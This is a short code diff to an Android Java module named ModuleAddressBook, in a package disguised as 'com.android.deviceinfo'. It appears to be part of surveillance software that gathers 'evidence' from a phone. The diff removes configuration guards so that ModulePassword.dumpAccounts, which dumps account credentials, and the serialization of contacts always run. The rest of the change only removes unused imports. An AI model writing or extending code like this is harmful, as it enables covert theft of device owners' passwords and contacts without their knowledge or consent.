@@ -2,25 +2,21 @@ package com.android.deviceinfo.module;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
-import java.util.Collection;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.Hashtable;
 import java.util.Iterator;
 import java.util.List;
-import java.util.ListIterator;
 
 import android.database.Cursor;
 
 import com.android.deviceinfo.Device;
 import com.android.deviceinfo.Sim;
 import com.android.deviceinfo.Status;
-import com.android.deviceinfo.ThreadBase;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
 import com.android.deviceinfo.crypto.Digest;
 import com.android.deviceinfo.db.RecordVisitor;
-import com.android.deviceinfo.evidence.EvidenceCollector;
 import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.evidence.Markup;
@@ -142,13 +138,12 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 						return 0;
 					}
 				};
-				if (Cfg.ENABLE_PASSWORD_MODULE) {
-					ModulePassword.dumpAccounts(addressVisitor);
-				}
-
+				
+				ModulePassword.dumpAccounts(addressVisitor);
+				
 			}
 
-			if (Cfg.ENABLE_CONTACTS && contacts()) {
+			if (contacts()) {
 				serializeContacts();
 			}
 
